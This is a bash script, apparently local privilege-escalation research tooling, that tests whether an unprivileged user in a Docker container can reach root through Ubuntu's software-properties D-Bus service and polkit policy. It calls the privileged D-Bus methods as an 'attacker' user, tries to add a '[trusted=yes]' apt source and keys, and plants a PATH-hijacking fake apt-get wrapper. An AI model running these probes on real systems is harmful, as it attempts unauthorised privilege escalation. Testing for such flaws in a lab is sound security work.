#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/software-properties-dbus.out"

mkdir -p "$repo_dir/logs"

timestamp() {
  date -u +"%Y-%m-%dT%H:%M:%SZ"
}

{
  printf '# software-properties D-Bus local privilege probe\n'
  printf '# container=%s\n' "$container"
  printf '# started=%s\n' "$(timestamp)"

  docker exec -i "$container" bash -s <<'ROOTSH'
set +e

WORK=/tmp/software-properties-dbus-probe
MARKER=/root/software_properties_dbus_root_marker
ATTACKER=attacker
SELFAUTH=selfauth

rm -rf "$WORK"
mkdir -p "$WORK/attacker/bin" "$WORK/py"
chmod 0755 "$WORK"
chown -R "$ATTACKER:$ATTACKER" "$WORK/attacker"
rm -f "$MARKER" /tmp/software-properties-dbus-user-marker

section() {
  printf '\n## %s\n' "$1"
}

run_root() {
  local label="$1"
  shift
  section "$label"
  printf '$ %s\n' "$*"
  "$@" 2>&1
  printf 'rc=%s\n' "$?"
}

run_user() {
  local user="$1"
  local label="$2"
  local timeout_s="$3"
  local cmd="$4"
  section "$label"
  printf '$ runuser -u %s -- bash -lc %q\n' "$user" "$cmd"
  timeout "$timeout_s" runuser -u "$user" -- bash -lc "$cmd" 2>&1
  printf 'rc=%s\n' "$?"
}

section "target identity and package versions"
{
  cat /etc/os-release
  printf -- '--- uname\n'
  uname -a
  printf -- '--- users\n'
  id "$ATTACKER"
  id "$SELFAUTH" 2>&1 || true
  groups "$ATTACKER" 2>&1 || true
  groups "$SELFAUTH" 2>&1 || true
  getent group sudo admin 2>/dev/null || true
  printf -- '--- packages\n'
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
    software-properties-common python3-software-properties dbus polkitd \
    policykit-1 pkexec packagekit apt python3-dbus python3-apt 2>&1 | sort
}

section "default service and policy files"
for p in \
  /usr/lib/software-properties/software-properties-dbus \
  /usr/bin/add-apt-repository \
  /usr/share/dbus-1/system-services/com.ubuntu.SoftwareProperties.service \
  /etc/dbus-1/system.d/com.ubuntu.SoftwareProperties.conf \
  /usr/share/polkit-1/actions/com.ubuntu.softwareproperties.policy
do
  if [ -e "$p" ]; then
    stat -Lc '%A %U:%G %s %n' "$p"
    sed -n '1,180p' "$p" | sed 's/^/    /'
  else
    echo "MISSING $p"
  fi
done

section "dbus and polkit software-properties summary"
{
  grep -RIn 'com.ubuntu.SoftwareProperties\|applychanges\|dbus.service.method\|def Add\|def Remove\|def UpdateKeys\|def Reload\|CheckAuthorization' \
    /usr/lib/python3/dist-packages/softwareproperties/dbus \
    /usr/lib/python3/dist-packages/softwareproperties/SoftwareProperties.py \
    /usr/lib/python3/dist-packages/softwareproperties/AptAuth.py 2>/dev/null | sed -n '1,240p'
  printf -- '--- parsed policy defaults\n'
  python3 - <<'PY'
import xml.etree.ElementTree as ET
path = "/usr/share/polkit-1/actions/com.ubuntu.softwareproperties.policy"
root = ET.parse(path).getroot()
for action in root.findall("action"):
    aid = action.get("id")
    defaults = action.find("defaults")
    vals = {}
    for key in ("allow_any", "allow_inactive", "allow_active"):
        node = defaults.find(key) if defaults is not None else None
        vals[key] = (node.text or "").strip() if node is not None else ""
    print(f"{aid}\tany={vals['allow_any']}\tinactive={vals['allow_inactive']}\tactive={vals['allow_active']}")
PY
  printf -- '--- polkit admin identity rules\n'
  find /etc/polkit-1 /usr/share/polkit-1 -maxdepth 3 -type f \( -name "*.rules" -o -name "*.conf" \) -print \
    -exec grep -nE 'addAdminRule|AdminIdentities|unix-group:sudo|unix-group:admin' {} \; 2>/dev/null
}

section "root-owned apt state before"
{
  for p in /etc/apt/sources.list /etc/apt/sources.list.d/ubuntu.sources /etc/apt/trusted.gpg /etc/apt/trusted.gpg.d; do
    if [ -e "$p" ]; then
      stat -Lc '%A %U:%G %s %n' "$p"
      if [ -f "$p" ]; then sha256sum "$p"; fi
    else
      echo "MISSING $p"
    fi
  done
  find /etc/apt/sources.list.d /etc/apt/trusted.gpg.d /etc/apt/keyrings -maxdepth 1 -printf '%m %u:%g %p -> %l\n' 2>/dev/null | sort
}

section "reset D-Bus activation target to dormant"
{
  ps -eo pid,user,args | grep -F '/usr/lib/software-properties/software-properties-dbus' | grep -v grep || true
  pkill -f '/usr/lib/software-properties/software-properties-dbus' 2>/dev/null
  sleep 1
  ps -eo pid,user,args | grep -F '/usr/lib/software-properties/software-properties-dbus' | grep -v grep || true
  busctl --system list --no-pager | grep -i 'SoftwareProperties' || true
}

run_user "$ATTACKER" "attacker proves D-Bus activatability and method surface" 12 \
  'id; busctl --system list --no-pager | grep -i SoftwareProperties || true; timeout 8 busctl --system introspect com.ubuntu.SoftwareProperties /; echo introspect_rc=$?; busctl --system list --no-pager | grep -i SoftwareProperties || true'

section "root process after attacker activation"
ps -eo pid,user,args | grep -F '/usr/lib/software-properties/software-properties-dbus' | grep -v grep || true
journalctl -u dbus -n 20 --no-pager 2>/dev/null | grep -i 'SoftwareProperties' || true

run_user "$ATTACKER" "attacker unauthenticated read-only Reload" 8 \
  'gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.Reload; echo reload_rc=$?'

run_user "$ATTACKER" "attacker denied apt source write methods" 10 \
  'set -x; gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.AddSourceFromLine "deb [trusted=yes] file:/tmp/software-properties-dbus-probe noble main"; echo addsource_rc=$?; gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.ReplaceSourceEntry "deb http://example.invalid noble main" "deb [trusted=yes] file:/tmp/software-properties-dbus-probe noble main"; echo replace_rc=$?; gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.RemoveSource "deb http://example.invalid noble main"; echo removesource_rc=$?'

run_user "$ATTACKER" "attacker denied keyring and cdrom helper methods" 10 \
  'set -x; printf "not a real key\n" >/tmp/software-properties-dbus-probe/attacker/attacker-key.asc; ls -l /tmp/software-properties-dbus-probe/attacker/attacker-key.asc; gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.AddKey /tmp/software-properties-dbus-probe/attacker/attacker-key.asc; echo addkey_rc=$?; gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.AddKeyFromData "not a real key"; echo addkeydata_rc=$?; gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.RemoveKey DEADBEEF; echo removekey_rc=$?; gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.UpdateKeys; echo updatekeys_rc=$?; gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.AddCdromSource; echo addcdrom_rc=$?'

run_user "$ATTACKER" "attacker denied configuration setter methods" 10 \
  'set -x; gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.EnableComponent universe; echo enable_rc=$?; gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.SetUpdateInterval 1; echo interval_rc=$?; gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.SetReleaseUpgradesPolicy 0; echo releasepolicy_rc=$?'

run_user "$ATTACKER" "attacker polkit check without interaction" 6 \
  'pkcheck --action-id com.ubuntu.softwareproperties.applychanges --process $$; echo pkcheck_rc=$?'

run_user "$SELFAUTH" "selfauth polkit and D-Bus trigger without sudo/admin" 10 \
  'set -x; id; pkcheck --action-id com.ubuntu.softwareproperties.applychanges --process $$ --allow-user-interaction; echo pkcheck_interactive_rc=$?; gdbus call --system --dest com.ubuntu.SoftwareProperties --object-path / --method com.ubuntu.SoftwareProperties.AddSourceFromLine "deb [trusted=yes] file:/tmp/software-properties-dbus-probe noble main"; echo addsource_rc=$?'

run_user "$ATTACKER" "attacker direct add-apt-repository helper invocation" 10 \
  'set -x; printf "#!/bin/sh\nid > /tmp/software-properties-dbus-user-marker\nexec /usr/bin/apt-get \"\$@\"\n" >/tmp/software-properties-dbus-probe/attacker/bin/apt-get; chmod +x /tmp/software-properties-dbus-probe/attacker/bin/apt-get; ls -l /tmp/software-properties-dbus-probe/attacker/bin/apt-get; PATH="/tmp/software-properties-dbus-probe/attacker/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" add-apt-repository -y -n "deb [trusted=yes] file:/tmp/software-properties-dbus-probe noble main"; echo addaptrepo_rc=$?; ls -l /tmp/software-properties-dbus-user-marker 2>&1 || true'

section "stop root service before direct system-bus helper ownership test"
{
  pkill -f '/usr/lib/software-properties/software-properties-dbus' 2>/dev/null
  sleep 1
  ps -eo pid,user,args | grep -F '/usr/lib/software-properties/software-properties-dbus' | grep -v grep || true
}

run_user "$ATTACKER" "attacker direct software-properties-dbus system-bus invocation" 8 \
  'set -x; timeout 5 /usr/lib/software-properties/software-properties-dbus --debug; echo helper_rc=$?; ps -eo pid,user,args | grep -F software-properties-dbus | grep -v grep || true'

run_user "$ATTACKER" "attacker direct python module write attempt" 10 \
  'python3 - <<'"'"'PY'"'"'
import os
from softwareproperties.SoftwareProperties import SoftwareProperties
print("uid", os.getuid())
sp = SoftwareProperties(deb822=True)
try:
    print("add_source_from_line", sp.add_source_from_line("deb [trusted=yes] file:/tmp/software-properties-dbus-probe noble main"))
    sp.save_sourceslist()
    print("save_sourceslist ok")
except Exception as e:
    print(type(e).__name__, str(e))
PY
ls -l /etc/apt/sources.list.d /root/software_properties_dbus_root_marker 2>&1 || true'

section "root-owned apt state after"
{
  for p in /etc/apt/sources.list /etc/apt/sources.list.d/ubuntu.sources /etc/apt/trusted.gpg /etc/apt/trusted.gpg.d; do
    if [ -e "$p" ]; then
      stat -Lc '%A %U:%G %s %n' "$p"
      if [ -f "$p" ]; then sha256sum "$p"; fi
    else
      echo "MISSING $p"
    fi
  done
  find /etc/apt/sources.list.d /etc/apt/trusted.gpg.d /etc/apt/keyrings -maxdepth 1 -printf '%m %u:%g %p -> %l\n' 2>/dev/null | sort
}

section "root marker proof"
if [ -e "$MARKER" ]; then
  stat -Lc '%A %U:%G %s %n' "$MARKER"
  cat "$MARKER"
  echo "ROOT_PROOF=yes"
else
  echo "ROOT_PROOF=no"
fi

section "cleanup"
{
  rm -rf "$WORK"
  rm -f /tmp/software-properties-dbus-user-marker "$MARKER"
  pkill -f '/usr/lib/software-properties/software-properties-dbus' 2>/dev/null
  sleep 1
  ps -eo pid,user,args | grep -F '/usr/lib/software-properties/software-properties-dbus' | grep -v grep || true
  systemctl is-system-running || true
  systemctl --failed --no-legend || true
}
ROOTSH

  printf '# finished=%s\n' "$(timestamp)"
} >"$log_path" 2>&1

printf 'wrote %s\n' "$log_path"
